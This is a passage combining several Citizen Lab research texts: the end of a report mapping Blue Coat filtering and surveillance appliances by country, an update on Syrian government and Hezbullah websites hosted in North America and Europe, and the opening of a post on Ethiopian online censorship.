of the booming market for surveillance, filtration, and other sensitive technologies, including dual-use ICTs. Scrutiny and foresight regarding what this market has and has yet to become are critical, as the societal and political ramifications will only grow more profound as technologies develop and use becomes more widespread. Proposals on a framework for control (through sanctions, export regulations, and other methods) of dual-use and other technologies that may compromise human rights are forthcoming in a future blog post by Citizen Lab.\nPart IV: Areas for Further Research and Policy Discussions\nThis report raises several issues for further research and policy discussion:\nThere is a need for more transparency around censorship and surveillance practices as well as dialogue among states, ISPs, civil society, and the private sector. States and large ISPs have tended toward a lack of transparency when it comes to their capabilities for censorship and interception of network traffic. Their silence, however, should not be mistaken for the absence of such activity; indeed, many of them have moved to acquire and deploy powerful filtering and monitoring infrastructure, including Blue Coat Systems technology, as our report makes clear. Some countries have had elements of a public dialogue over network monitoring and filtering, others have not. In the US, for example, a raucous debate continues over whether ISPs should be able to massively filter network traffic based on content and type. These public debates have also emerged in Germany and France.70 Similarly, some debates have taken place over state surveillance and ISP participation in monitoring, although these are often hampered by limited public evidence of the scope and scale of these practices. Yet, as this report shows, even in countries where ISPs or governments may not have publicly declared their ability to exercise this kind of control and little public notice or debate has taken place, opponents of Internet filtering and massive interception should be aware that the infrastructure may already be present — and in some cases, built from the ground up as a kind of “surveillance-by-design.” By providing this overview, we hope to encourage civil society groups, governments, and researchers to take a closer look at why these devices are present in their country. We also hope that this report will encourage ISPs, manufacturers, and other actors involved in deployment of these products to consider publicly clarifying their scale and function.\nMore independent, evidence-based research on the global spread and use of censorship, surveillance, and other “dual-use” technologies is essential. Providing a clearer picture of the global presence of Blue Coat Systems devices highlights how widely such technologies are used and how technical interrogation methods can be used to determine their presence in specific instances. We see our methodology as an important component of the civil society toolkit (including academia) for engaging in ongoing debates over the proliferation of censorship and intercept technologies, among others. We hope to stimulate dialogue surrounding deployment of dual-use technologies, and provide empirical support for ongoing efforts to develop appropriate control strategies. It is important to note that our methodology does not reveal the intentions or exact uses of the Blue Coat Systems devices in question. We expect these to be different in each case, and think this is an important area for future research. If such contributions are going to be credible, however, it is important that the research be independently conducted and based on open and reproducible methods and empirical evidence.\nIt is time to examine the appropriate course of action for companies that participate in the industry for network surveillance, censorship and other sensitive technologies. While the pursuit and development of new markets and products is naturally a priority to for-profit companies, they remain obliged at all times to respect human rights and avoid activities that would infringe upon them.71 The events of the Arab Spring have raised awareness that the products and services of this sector can and will be used to advance illegitimate ends that violate international human rights law. Companies can no longer simply assert that it is acceptable to provide their technology to any prospective client, no matter how questionable, until their home governments instruct them otherwise. Civil society and academic groups have indicated this is an area of high concern, key governments have begun pursuing this issue, and it is time for the private sector to join the dialogue and commit to finding solutions.\nTo that end, we pose the following questions to Blue Coat Systems, which we hope will spark further constructive dialogue:\n\nWhat human rights policy commitments and due diligence measures does Blue Coat Systems have in place concerning the development and sales of its products and services?\n\n\nIn designing its products, does Blue Coat Systems assess their potential human rights impact? Have product designs ever been considered “off-limits” given inherent capabilities to undermine privacy or freedom of expression?\n\n\nWhat if any resources does Blue Coat Systems devote to human rights compliance at the operational level? For example, what percentage of the annual budget is allocated to human rights programs, investigations or training? What human rights training is provided to staff in each department of the company (including executive leadership as well as engineering, sales and legal departments)? What is staff awareness of the human rights implications of deployment of Blue Coat Systems products?\n\n\nDoes Blue Coat Systems attempt to integrate a “know your customer” standard into its business practices? Does it attempt to discern the purpose for which a client seeks to purchase its products or services? If so, how (for example, in the case of the services provided to King Abdulaziz City for Science and Technology Internet Services Unit)? If the potential client is a government or located in a country known to have experienced unrest, does Blue Coat Systems investigate the human rights track record of that potential client? If human rights concerns are flagged, how does Blue Coat Systems act on such concerns?\n\n\nWhat is the process at Blue Coat Systems for evaluating compliance with US sanctions and export controls?\n\n\nWhat processes are in place for ensuring “downstream” compliance with human rights policy commitments and due diligence by resellers, distributors and other third parties with whom Blue Coat Systems contracts? Particularly after the discovery of Blue Coat devices in Syria as described in Part I of this report, were any changes made concerning such processes?\n\nWe commit to publishing in full Blue Coat System’s reply.\nOur work supports the need for an effective framework for control of technologies that have significant potential to undermine human rights. It is important to emphasize that the questions posed to Blue Coat Systems (above) are pertinent as well for all other companies active in this industry. Given the many documented instances of advanced information communication technologies put to use by governments and other actors for the purpose of maintaining power and control at the expense of human rights, and the rapid, lucrative growth of the market, it is clear that this industry cannot continue to operate in a largely unregulated atmosphere. While control of dual-use and other sensitive technologies raises significant complexities (see Part III above), some form of check on this industry is essential—whether it be proactive self-regulation, export controls, sanctions, or a combination of these and other efforts. We hope that more companies will step forward to discuss how such controls can be applied in a pragmatic manner. The input of civil society is likewise crucial, as is the leadership of governments in developing multilateral approaches for effective control.\nAcknowledgements\nThanks to Eireann Leverett and Shawn Merdinger for pointing the way.\nMedia Coverage\nMedia coverage of the report includes IT World; Salon; Ars Technica; Slate; ComputerWorld; TTV, MacFound, AllGov and Internet Law Center.\nFootnotes\n1“WebFilter,” Blue Coat, http://www.bluecoat.com/products/proxysg/addons.\n2“Blue Coat PacketShaper Application List,” Blue Coat, http://www.bluecoat.com/sites/default/files/documents/files/PacketShaper_Application_List.c.pdf.\n3“The Growing Need for SSL Inspection”, Blue Coat, https://www.bluecoat.com/security/security-archive/2012-06-18/growing-need-ssl-inspection.\n4“PacketShaper,” Blue Coat, http://www.bluecoat.com/products/packetshaper.\n5http://www.bluecoat.com/products/packetshaper.\n6“Company,” Blue Coat, http://www.bluecoat.com/company.\n7Some ISPs in the Middle East and North Africa and other regions in the developing world deploy Blue Coat Systems appliances such as Blue Coat CacheFlow mainly to reduce bandwidth costs, which tend to be expensive in these countries.

    "text": "\n\t\t\t\tRead the report: Planet Blue Coat: Mapping Global Censorship and Surveillance Tools.\nCountries of interest in which Blue Coat devices were located:\nProxySG\nEgypt, Kuwait, Qatar, Saudi Arabia, United Arab Emirates\nPacketShaper\nAfghanistan, Bahrain, China, India, Indonesia, Iraq, Kenya, Kuwait, Lebanon, Malaysia, Nigeria, Qatar, Russia, Saudi Arabia, South Korea, Singapore, Thailand, Turkey, Venezuela\nBahrain\nWe identified a single PacketShaper installation flagged by Shodan as recently as December 31, 2012. The address identified by Shodan was on a netblock associated with the Bahrain Internet Exchange (BIX). Additional research using the iplocation.net service and databases provided by db4 and maxmind identify the ISP as “Central Informatics Organisation.” Despite the recent identification by Shodan, this host was not accessible during the verification period in early January 2013. According to its website, BIX is an Internet exchange point that serves “ISPs and the Government Sector in the Kingdom of Bahrain.”1 Privacy International has stated that BIX “may have the capacity to play a role in communications monitoring,” and BIX itself has openly acknowledged that they may monitor ports and connections when “information is required by applicable law.”2 The existence of Blue Coat products on an Internet exchange network suggests a state-level initiative. Bahrain’s extensive censorship regime has only intensified in the wake of the Arab Spring protests. The government actively filters websites critical of the regime, as well as content that is perceived as pornographic, un-Islamic, or accepting of LGBT issues.3 In the past, the Bahraini government has reportedly used web filtering technologies created by Blue Coat Systems and McAfee.4 Bahrain extensively monitors online activity and has used Western-made surveillance software to generate transcripts as part of the interrogation and torture of prisoners.5\nKuwait\nWe have identified three Blue Coat products present in Kuwait. ProxySG was present on a network belonging to Mada Communications, while the ISPs of Gulfnet and Fast Telco each had a PacketShaper installation present on their networks. These were all initially identified by Shodan and were verified during our testing. Kuwait has targeted blasphemous, LGBT, and perceived un-Islamic content online for censorship.6 The Kuwaiti government has also considered criminalizing the “misuse” of social media, especially with regards to defamation and criticism of government policies, and “allow[ing] government entities to regulate the use of the different new media outlets such as Twitter.”7 In the past, Kuwaiti ISPs have reportedly used SmartFilter and Netsweeper to censor content.8\nQatar\nWe identified an installation of both ProxySG and PacketShaper on netblocks associated with Qatar Telecom (QTel). Shodan initially identified the PacketShaper installation in late September 2012 and this was verified during testing. The ProxySG installation was initially found as a result of network scanning in October 2012 and verified as accessible in January 2013. A 2011 Wall Street Journal investigation found that Blue Coat technologies have been used in Qatar among other countries in the Gulf.9 Qatar’s censorship regime focuses on websites it considers socially inappropriate, including anti-Islamic, LGBT, and sexual health-related content. Some political websites are also censored.10 According to the U.S. State Department, Qatar censors online content through state-owned ISPs and through proxy servers that monitor chat rooms and email.11 Qatar’s Telecommunications Law punishes those “using a telecommunication network or allowing such use for the purposes of disturbing, irritating or offending any person,” thus giving free reign to authorities to crack down on controversial content.12 Moreover, Chapter 15 of the law requires service providers to comply with government requests for information deemed “necessary for exercising its powers.”13\nSaudi Arabia\nWe were able to identify five total Blue Coat products in Saudi Arabia. There are two installations of the ProxySG product on a network block identified as SaudiNet that was initially detected in mid-2012 by Shodan and verified during testing. Additionally, there are three total PacketShaper installations on the networks identified as ITC, King Abdulaziz City for Science and Technology (KACST) and Nournet. Shodan initially identified the installations on KACST and ITC, while a Google search identified the installation on Nournet. Notably, KACST’s Internet Services Unit (ISU) is responsible for implementing the state’s filtering regime.14 Blue Coat Systems has reportedly been present in Saudi Arabia since 2007, when the company announced its intention to expand operations across the region, and has since been open about its relationship with the Saudi government.15 The company cites ISU’s use of ProxySG appliances as a success story, noting that its products allow ISU to “implement flexible policy control over content, users, applications and protocols to protect its users from malicious content.”16 Saudi Arabia’s strict regime of Internet censorship has only intensified following the Arab Spring revolutions and protests in the Middle East and North Africa.17 The government openly acknowledges its engagement in Internet and telecommunications censorship “to block those pages of an offensive or harmful nature to society, and which violate the tenants [sic] of Islamic religion or societal norms.”18 Saudi Arabia has used SmartFilter, now owned by McAfee, to index websites by category and implement mass filtering of content deemed insulting to the political system and offensive to Islamic morals.19\nUnited Arab Emirates\nWe found five installations of ProxySG on networks in the United Arab Emirates (UAE). All of these installations were on network blocks belonging to the ISP Etisalat. Shodan initially identified one installation on January 1, 2013 while follow up scans around the netblock turned up three additional installations. These installations were accessible during verification but have become sporadically available since their initial verification. Blue Coat Systems maintains a support centre in Dubai’s Internet City (its only known Middle East office) for its regional clients.20 In 2011, the Wall Street Journal reported that the company’s technologies have been used in the UAE, along with a number of other Gulf countries.21 (The same report revealed that one of Blue Coat Systems’ authorized Emirati distributors had sent ProxySG devices to the Syrian regime.22) In the UAE content is blocked pursuant to instructions from the Telecommunications Regulatory Authority (TRA) to ISPs, based on pre-determined content categories. Etisalat, the UAE’s dominant ISP, outlines TRA’s “Prohibited Content Categories” on its website, including content related to pornography, gambling, malicious computer use, circumvention tools, terrorism, and religious hate speech.23 However, the government also filters political websites on an ad hoc basis. Like Kuwait, ISPs in the UAE have used both SmartFilter and NetSweeper to censor content.24 The UAE has made surveillance of cybercafé patrons mandatory by requiring ID and the recording of personal information of users.25\nAfghanistan\nWe identified a single installation of the PacketShaper product on a network identified as an “Afghan Telecom Government Communication” network in Kabul. This was initially identified by Shodan on December 31, 2012 and was accessible during our verification. Pursuant to Afghanistan’s 2005 Telecom Law, monitoring of communication and Internet traffic is permitted when demanded by the Afghanistan Telecom Regulatory Authority, and ISPs must comply with government requests for data in matters of national security.26 In 2010, Afghanistan’s Minister of Information and Culture stated the government’s intent to block websites that promote violence and terrorism, facilitate gambling, deal with “sexual issues,” and associate with drug production and trafficking.27 The government admitted at the time that it did not yet possess the technology to institute website blocking, and reports from the same year indicated that Afghani ISPs were “struggling to enforce” official directives to filter the Internet.28 It is possible that Blue Coat PacketShaper devices that are now employed in the country could have been used to bridge that initial technological gap and build a state-level filtering and surveillance regime from the ground up.\nEgypt\nWe identified a single installation of ProxySG though it was not verified during our testing phase and was inaccessible in follow-up connection attempts. Shodan identified the presence of the product on a network belonging to an Etisalat netblock as recently as October 2012. The IP that Shodan identified resolves to a domain that is associated with the nile-online.net domain. Prior to the 2011 revolution, the Mubarak regime actively monitored social networking platforms, e-mail exchanges, and mobile phone communications.29 In response to the Arab Spring protests of 2011, the government employed a number of techniques to control dissent, including the complete shutdown of Internet access on most ISPs.30 The Mubarak regime also allegedly used Deep Packet Inspection (DPI) tools provided by Narus, a Silicon Valley-based firm and Boeing subsidiary.31 Freedom House reports that the post-Mubarak government has continued to selectively remove controversial content and closely surveil activists and bloggers on Internet and social media.32 In March 2012, for example, the Ministry of Telecommunications and Information Technology announced its intention to block pornographic websites from within the country.33 Additionally, Freedom House reports that the Homeland Security Agency allegedly acquired DPI and filtering equipment in 2011.34\nIraq\nWe identified a single PacketShaper installation that was present on the network of City Telecom, an ISP based in Baghdad. It was identified by Shodan as early as August 2012 and was still accessible during our verification in early January 2013. The current mapping of Blue Coat PacketShaper products in Baghdad coincides with the post-war reconstruction of Iraq’s telecommunications industry and the drafting of legislation specifically tailored to address Internet use. Most recently, the Iraqi government drafted an “Information Crimes Law” that would ostensibly aim to “to provide legal protection for the legitimate use of computers and information networks, and punish those who commit acts that constitute encroachment on the rights of their users,”35 including perpetrators of vaguely defined “prohibited activities” such as harming the “reputation of the country,” broadcasting “false or misleading facts,” and violating “religious, moral, family, or social values.”36 The law also sets out penalties for ISPs that fail to comply with government requests for user data.37 As of December 2012, parliament has reportedly placed the Information Crimes Law on hold.38 However, the deployment of Blue Coat PacketShaper devices, in conjunction with legislation that permits the monitoring and prosecution of Internet users, indicates possible ‘surveillance by design’ in the context of post-conflict reconstruction.\nLebanon\nWe identified two installations of PacketShaper during the course of research. One installation was identified initially by Shodan on December 12, 2012. This installation was found on a netblock associated with “IncoNet Data Management.” An additional PacketShaper installation was identified by a Google search on a netblock associated with “Virtual ISP Lebanon” (visp). Tests performed in 2009 indicated no known state-level Internet filtration or surveillance in Lebanon.39 Since 2010, however, Lebanese authorities have detained many citizens for criticizing the government and army.40 Most recently, the Lebanese Ministry of Information has drafted a new law prohibiting the publication of online content deemed offensive to “public morals.”41\nTurkey\nWe identified a single installation of PacketShaper that was identified by a Google search in early 2013. This was on a netblock associated with TTNet, Turkey’s largest ISP and a subsidiary of the formerly state-owned Turk Telecom.42 Blue Coat Systems expanded its presence in the country in 2008 by adding a number of Turkish distributors “to better serve Turkish companies and organizations.”43 One reseller, Innova, reportedly sought to combine “its technical expertise and reputation in the market with Blue Coat ProxySG appliances to provide organizations with tools they need to gain control over the appliances on their networks.”44 Freedom House reports that, since 2001, Turkey has passed a series of laws that collectively empower state organizations to filter content.45 Law No. 5651 — “Regulation of Publications on the Internet and Suppression of Crimes Committed by Means of Such Publication” — ostensibly seeks to prevent youths from accessing illicit content such as pornography and gambling. However, that regulation and other laws have been applied more broadly to block political content such as criticism of Kemal Ataturk, news sources, and media sharing websites.46 In November 2011, the Turkish government instituted a national filtering system that requires ISPs to offer customers the option to block content deemed inappropriate for families and children.47 Engelli Web, a Turkish website that tracks censored content, lists over 22,000 blocked websites as of January 14, 2013.48\nRussia\nWe identified a single installation of the PacketShaper product on a netblock associated with the Vimpelcom ISP. This was initially identified by Shodan on December 30, 2012 and was verified during testing. A high level of state control over the domestic telecommunications market exists in Russia.49 Recently, Prime Minister Dmitry Medvedev signed a new law “blacklisting” sites the government views as fronts for illegal content.50 Roskomnadzor — Russia’s federal service for monitoring mass media compliance — has introduced Deep Packet Inspection “on a nationwide scale,”51 having previously announced a competitive “contest” for software designed to monitor sites for “extremist” content.52 Russia’s Soviet-era system to intercept phone traffic has also undergone recent upgrades.53 One of the largest providers in the region, Mobile TeleSystems OJSC (MTS), has used Blue Coat in the past at the Internet gateway of MTS’s headquarters in Moscow to protect against “Internet threats.”54 It is reasonable to surmise that other telecoms in Russia are using Blue Coat for the same purposes; however, as Russia seems to be increasing surveillance of online content, the use of foreign technology for political purposes must be monitored in the future.\nChina\nWe identified three installations of Blue Coat products present on the netblock associated with ChinaNet. Two were identified by Shodan initially in late 2012 and verified during testing. One additional installation of PacketShaper was found through a Google search. This installation had a system name of “WT-CHENGDU-INT-PS” and was present on a ChinaNet IP in Sichuan. ChinaNet is an “operational brand” of state-owned China Telecom and is described as “the world’s largest Internet network.”55 China’s Internet filtering and surveillance regime, often referred to as the “Great Firewall,” is pervasive and multifaceted. The government employs a variety of means to prevent citizens from accessing material that is deemed politically threatening or socially controversial, including “tight regulations on domestic media, delegated liability for online content providers, just-in-time filtering, and ‘cleanup’ campaigns.”56 Deep Packet Inspection technology is used to blacklist pages based on pre-defined keywords, as well as to monitor users’ Internet activity.57 Moreover, thousands of government and private sector workers reportedly monitor and censor objectionable content on social media platforms, blogs, and political websites.58 Chinese legislation holds Internet information service providers accountable for content on their servers and specifies nine forbidden content categories, including material that opposes constitutional principles, threatens national security and the state, or “undermines social stability.”59\nSouth Korea\nThere were three installations of PacketShaper identified on netblocks associated with Korea Telecom. All three installations were initially identified by Shodan in December 2012. These were verified as accessible, though some of these have been sporadically available since verification. South Korea’s government imposes more constraints on online speech than most democratic countries. While the rate of filtering is generally low, online content and expression is heavily regulated through legal and technical measures.60 ISPs target social content, and content related to conflict and security — especially content that is pro-North Korea or considered threatening to national security.61 The Korea Communications Standards Commission is authorized to order the blocking or closure of websites, the deletion of messages, and the suspension of users, as well as to mediate online defamation disputes.62 Although the Constitutional Court recently ruled a five-year-old online real-name registration rule to be unconstitutional, concerns over government surveillance remain.63 In 2012, Freedom House reported that the government has increased purchases of interception equipment and documented instances where authorities have not followed protocol when obtaining information on citizens.64 For instance, a scandal emerged in 2012 over unlawful surveillance activities by the Civil Service Ethics Division, a division established in 2008 for the purposes of monitoring corruption amongst government officials. The Korean Broadcasting System released over 2,600 records documenting the illegal surveillance of civilians known to be critical of the government, such as labour union leaders and journalists.65 In 2010, seven members of the Division were convicted for illegal surveillance of citizens.66\nIndonesia\nA single installation of PacketShaper was identified by a Google search. This installation was present on a netblock associated with the Lintasarta ISP. ISPs in Indonesia are subject to filtering requests from the Ministry of Communication and Information Technology.67 Indonesian Internet filtering heavily targets pornographic Web sites. Several ISPs also blocked some sex education and LGBT content, as well as sites offering circumvention tools. However, testing revealed that filtering was unsystematic and inconsistent, as demonstrated by differences across ISPs.68 The government has occasionally blocked anti-Islamic content.69\nMalaysia\nWe identified three PacketShaper installations in Malaysia during research. Two installations were initially identified by Shodan in late 2012 and subsequently verified. They were present on netblocks associated with Jaring and TMNet. They have since been sporadically accessible. There was an additional installation identified by a Google search in early 2013 on a netblock associated with the Arcnet ISP. Blue Coat Systems maintains a physical presence in the country, with its Asia Pacific Headquarters located in Kuala Lumpur. While there is no evidence of technical Internet filtering in Malaysia, online content is regulated through other means.70 The Communications and Multimedia Act (1998) prohibits online content that is “indecent, obscene, false, menacing, or offensive in character with intent to annoy, abuse, threaten or harass any person.”71 The Malaysian Communications and Multimedia Commission, which is responsible for regulating the Internet, is known for tracking online discussions and asking content creators to remove such content.72 Freedom House has expressed concern that authorities seem to be capable of identifying anonymous Internet and mobile users with the help of service providers.73 In April 2012, the government passed the Security Offenses (Special Measures) Act, which authorizes the interception of communications without a judicial order in cases of vaguely defined security offences.74\nSingapore\nDuring research, we identified two installations of PacketShaper in Singapore. One was initially identified by Shodan in mid-2012 and verified on a netblock associated with SingNet. This installation has been sporadically accessible since verification. An additional installation was found by a Google search on a netblock associated with the ViewQwest ISP. Singapore engages in minimal Internet filtering by blocking only a small set of high-profile pornographic Web sites, suggesting that filtering is imposed for symbolic, rather than preventative, purposes.75 Rather than employing technical measures to control online content, the government utilizes licensing controls as well as legal pressures, such as defamation suits.76 All ISPs offer content filtering services for residential broadband subscribers.77 A 2006 Privacy International report found that Singaporean law permits government surveillance of Internet activity and “grants law enforcement broad power to access data and encrypted material when conducting an investigation.”78\nThailand\nA single PacketShaper installation was identified by Shodan in late 2012, which was verified as accessible. This installation was present on a netblock associated with the ISP CS Loxinfo, which provides home and business Internet service. Thailand primarily blocks sites related to political opposition, pornography, online gambling, and circumvention tools.79 A central focus of blocking is lèse-majesté content.80 Lèse-majesté refers to punishment for any negative critical remarks about the monarchy and is strictly enforced through provisions in the Penal Code. Internet filtering in Thailand is governed by the Computer Crime Act (2007), which authorizes the prosecution of Internet intermediaries for “intentionally supporting or consenting for crimes linked to the use of computers,” effectively making Internet intermediaries legally responsible for policing lèse-majesté content.81 There has been some concern over indications that the Thai government intends to increase its capacity to intercept private communications.82 For example, in December 2011, Thai authorities introduced a proposal for purchasing a four million baht lawful interception system for the purposes of cracking down on online lèse-majesté content.83\nIndia\nWe identified four PacketShaper installations present in India. These installations were all initially identified by Shodan in late 2012 and verified as accessible. They were present on netblocks associated with the ISPs of Bharti Airtel, Reliance, and Tata Communications, all of which have been implicated in filtering to some degree. In July 2012, Citizen Lab found that websites in Omani cyberspace were being inadvertently filtered as a result of a traffic peering arrangement between Bharti Airtel and Omani ISP Omantel.84 Reliance Communications was one of several ISPs to block file-sharing sites,85 while Tata Communications has reportedly used Netsweeper for filtering.86 India engages in selective filtering in many categories, including politically “extremist” websites.87 Despite its commitment to free expression, amendments to the country’s Information Technology Act (ITA) in 2008 have been criticized as overly broad. Section 66A, for example, criminalizes the sending of “offensive messages” through telecommunications services without clarifying what constitutes “offensive.”88 Moreover, Section 69 of the ITA authorizes government agencies to monitor and intercept Internet traffic and user information for purposes of national security or cyber security.89\nKenya\nThere were three PacketShaper installations found in Kenya during research. All three were initially identified by Shodan in December 2012 and were verified as accessible. These were on netblocks associated with Hughes Network Systems, which is a satellite-based Internet provider. The hostnames of the IP addresses of these installations resolve to the iWayAfrica domain, which is an African provider of broadband Internet service. In 2012, it was reported that the Communications Commission of Kenya was implementing a system to monitor incoming and outgoing traffic on the country’s networks, including personal e-mails, in order to respond to potential cyber threats. Mobile operators were instructed to cooperate in the installation of Internet traffic monitoring equipment known as Network Early Warning Systems.90\nNigeria\nDuring research there were two PacketShaper installations found on networks in Nigeria. One was identified by Shodan during mid-2012 and was verified as accessible. This installation was present on a netblock associated with the IPNX ISP, and had a system name of “IPNX_SHAPER” set on the login screen. There was an additional installation on a netblock associated with Cobranet. (Note that in the data provided, the installation is listed as a Lebanese IP address because the ISP operating in Nigeria is of Lebanese ownership, as seen in the whois record for cobranet.org.) No evidence of filtering has been found in Nigeria in the past.91 It has been reported that some ISPs block access when users are found to be downloading copyrighted content. Freedom House states that this is done not to protect intellectual property but to manage network traffic.92\nVenezuela\nWe identified a single installation of PacketShaper on a netblock belonging to CANTV Servicios, one of the country’s largest telecommunications providers and a state-owned enterprise.93 This was identified by Shodan in August 2012 and was verified during testing. There is no current evidence of filtering of political or social sites in Venezuela.94 However, Reporters Without Borders has expressed concern that the lack of extensive Internet censorship in the country ignores other methods of controlling Venezuelan cyberspace, such as the monitoring of Internet forums and websites for politically sensitive content.95\nFootnotes\n1“FAQ,” Bahrain Internet Exchange, http://www.bix.bh/faq_general.php.\n2https://www.privacyinternational.org/reports/surveillance-briefing-bahrain/surveillance-in-practice; and “Memorandum of Understanding (MoU),” Bahrain Internet Exchange, http://www.bix.bh/mou.php.\n3“Bahrain,” OpenNet Initiative, http://opennet.net/research/profiles/bahrain.\n4Paul Sonne and Steve Stecklow. “U.S. Products Help Block Mideast Web.” Wall Street Journal, March 27, 2011. http://online.wsj.com/article/SB10001424052748704438104576219190417124226.html\n5“Freedom on the Net 2012: Bahrain,” Freedom House, http://www.freedomhouse.org/report/freedom-net/2012/bahrain#_ftn8; and Ben Elgin and Vernon Silver, “Torture in Bahrain Becomes Routine With Help From Nokia Siemens,” Bloomberg, August 22, 2011, http://www.bloomberg.com/news/2011-08-22/torture-in-bahrain-becomes-routine-with-help-from-nokia-siemens-networking.html.\n6“Kuwait,” OpenNet Initiative, August 6, 2009, http://opennet.net/research/profiles/kuwait.\n7Kevin Collier, “Kuwait moves toward criminalizing online dissent,” The Daily Dot, August 16, 2012, http://www.dailydot.com/news/kuwait-social-media-dissent-law/.\n8Helmi Noman and Jillian C.

    "text": "\n\t\t\t\tDownload PDF version\nIn the November 2011 report, The Canadian Connection: An investigation of Syrian government and Hezbullah web hosting in Canada, the Citizen Lab examined the use of web servers based in Canada, the U.S., and European countries to host Syrian government websites and websites of the Lebanese political party Hezbullah. We explored the complex ethical, political, and legal issues raised by provision of web hosting services to entities associated with repressive regimes and human rights abuses. Since the publication of that report, Citizen Lab has continued to monitor legal and technical developments related to web hosting.\nThis update details our findings that, while many of the websites we examined in 2011 have changed hosting providers, a number of Syrian government and Hezbullah websites still maintain an online presence through the services of North American and European web hosts.\nIn the report, the Citizen Lab documented a significant number of Syrian government websites hosted by Canada-based web servers, including the websites of the Ministry of Culture, Ministry of Transport, Ministry of Electricity, and Syrian Patent Office, which raised questions regarding the applicability to web hosting of existing sanctions regimes against Syria. We also found that the Syrian TV station, Addounia TV, which is sanctioned by Canada1 and the European Union2 for inciting violence against Syrian citizens, used Canada-based web servers to host its website addounia.tv.\nMoreover, we found that the website for Hezbullah’s official media arm, Al-Manar, was hosted on Canada- and U.S.-based web servers and employed Canada-based web servers to stream its TV broadcast globally, while the website and radio stream of Hezbullah radio station Al-Nour were hosted by U.S.-based web hosts.\nThe U.S. and Canada classify Hezbullah as a terrorist organization,3 while Al-Manar satellite broadcasts have been banned by the U.S., France, Spain, and Germany as well as the European Union.4 The United States includes Al-Manar and Al-Nour on its Specially Designated Nationals and Blocked Persons List,5 a list of entities with which U.S. persons are generally prohibited from dealing, and the assets of which are blocked.\nA number of changes in web hosting of these entities have taken place since November 2011.\nNotably, over the past year changes in hosting of Syrian government websites have taken place that may have been prompted at least in part by Syrian government action, rather than as a result of Western reaction.\nSeveral Syrian government websites have moved to local hosting after a government mandate demanded that all websites of government and public authorities must be hosted within Syria. The Arabic text of the mandate (number 7944/15) was issued by the Syrian prime minister’s office on June 7, 2012 and published by state-run media.6 It stated:\n\nDue to the fact that there are so many security vulnerabilities with websites belonging to some public organizations, we order all ministries, institutions, companies and all other public organizations to take the the following necessary measures:\n\nAll Syrian government websites must be moved to hosting servers within the borders of the Syrian Arab Republic. The National Agency for Network Services can provide assistance in this regard by having the websites hosted on their available servers;\nAll websites must conduct web server security reviews to be performed at least once a year by Syria’s Center for Information Security at the National Agency for Network Services; and,\nAll security vulnerabilities found on government websites must be fixed immediately in coordination with the Center for Information Security at the National Agency for Network Services.\n\n\nAs of October 2, 2012, most of the Syrian government websites that we reported in The Canadian Connection to be hosted on North American and European servers have indeed been moved to servers on the Syrian network. We also found, however, that some Syrian government websites remain hosted in North America and Europe.\nOrganizations whose websites are hosted in the U.S. include:\n\nThe official state mouthpiece run by the Ministry of Information, Sana News Agency (sana.sy, hosted on SoftLayer Technologies, Texas);\nThe Ministry of Woqf (Religious Affairs) (mow.gov.sy hosted on HostDime.com, Florida);\nThe Ministry of Economy and Trade, Syrian Patent Office (spo.gov.sy hosted on PrivateSystems Networks, New Jersey);\nThe Hama City government (hama.gov.sy hosted on WeHostWebSites.com, Colorado);\nThe Prime Minister’s Office; General Authority for Development (gcb.gov.sy hosted on Jumpline, New York); and\nThe Ministry of Religious Affairs (Endowment) in the city of Aleppo (aleppowakf.gov.sy hosted on Secured Private Network, California).\n\nAdditionally, some websites have switched among North American- and European-based hosts. The website of Syria’s General Commission for Competition and Antimonopoly (www.competition.gov.sy), formerly hosted on U.S. servers, is now hosted on Canadian servers (IWeb Technologies, Quebec).\nAlso, Addounia.tv, previously hosted by Canada-based iWeb Technologies, was moved first to servers in Germany operated by hosting company LeaseWeb, and currently hosted on servers in the Netherlands operated by hosting company Interactive 3D. Addounia TV has been using webstreaming as an alternative way to broadcast its content after the two Middle East satellite operators, Nilesat and Arabsat, took it off the air on July 19, 2012 at the request of the Arab League.7\nHezbullah-affiliated sites have also made changes to their hosting providers. Hezbullah’s primary website Almanar.com.lb is now hosted on UK-based servers instead of in North America, though Al-Manar TV still uses U.S. servers to livestream its broadcast at IP address 38.96.175.90. Additionally, the website of the “Islamic Resistance In Lebanon – Hezbullah” (http://moqawama.org), which refers to itself as the “official website of the Islamic Resistance in Lebanon,” moved from U.S. web servers to web hosting services in the UK (ServerSpace Limited at IP 31.24.33.158).\nHezbullah’s radio station Al-Nour (alnour.com.lb), however, which broadcasts from Lebanon and offers audio streaming of its live broadcasts (http://www.almanar.com.lb/manarlive.php), is still hosted on U.S. servers (eNET at IP 64.79.68.246) and uses U.S.-based servers to livestream its broadcast online at nour.itw-hosting.net (IP 216.152.133.16).\nConclusion\nGlobally distributed web hosting remains a very complex and highly nuanced issue.\nImportant developments that have occurred since the publication of The Canadian Connection include the Syrian government’s issuance of a mandate that government websites be moved to local hosting; migration of the Addounia TV website and live streaming services from North America to servers based in Europe; and movement of segments of Hezbullah’s online services from North America to Europe.\nSuch developments suggest that these entities’ website operators are increasingly considering political jurisdiction when they make decisions about web hosting. The international community should likewise heighten its attention to this matter.\nWe continue to urge governments, civil society, and the private sector to carefully consider the role and responsibilities of web hosting companies — including through development of proper guidance to this industry — in international efforts to curb repressive regimes and entities associated with human rights abuses.\nFigure 1: Website hosting changes since Nov 2011 to October 2012 (based on DNS and ASN lookups.)

OpenNet Initiative (ONI) testing conducted in Ethiopia in September 2012 found that online political and news content continues to be blocked, including the blogs and websites of a number of recently convicted individuals. This blog post summarizes recent developments in Ethiopia and reports on the results of ONI testing in the country.\nRecent developments in Ethiopia\nRecent developments in Ethiopia underscore the dangerous environment in the country for critical political voices. Broad application of the country’s 2009 anti-terrorism proclamation has served as the basis for a number of recent convictions.1 In recent months, bloggers and journalists have been convicted on terrorism charges based on their online and offline writings. Most notably, in July 2012 blogger Eskinder Nega was jailed for 18 years on charges of attempting to incite violence through his blog posts.2 This incident was the seventh arrest of Nega for his critical writings.3 Nega was accused of conspiring with Ginbot 7, an oppositional political group labeled a terrorist organization by the Ethiopian government.4 Also convicted in absentia were Abebe Gellaw of the online news platform Addis Voice, as well as Mesfin Negash and Abiye Teklemariam, editors of the news website Addis Neger Online.5 A number of other journalists and opposition political figures were also simultaneously convicted of similar offenses.6 In January 2012, Elias Kifle, editor of Ethiopian Review, was convicted in absentia under the same anti-terrorism laws.7\nThe government of Ethiopia has also sought to make legislative changes that would affect the use of online communication tools. Legislation has been introduced that would restrict the use of Voice-over-Internet Protocol (VoIP) applications such as Skype. While government representatives portrayed the proposed law as a means of protecting domestic telecommunications providers,8 some critics described the new draft legislation as an attempt to 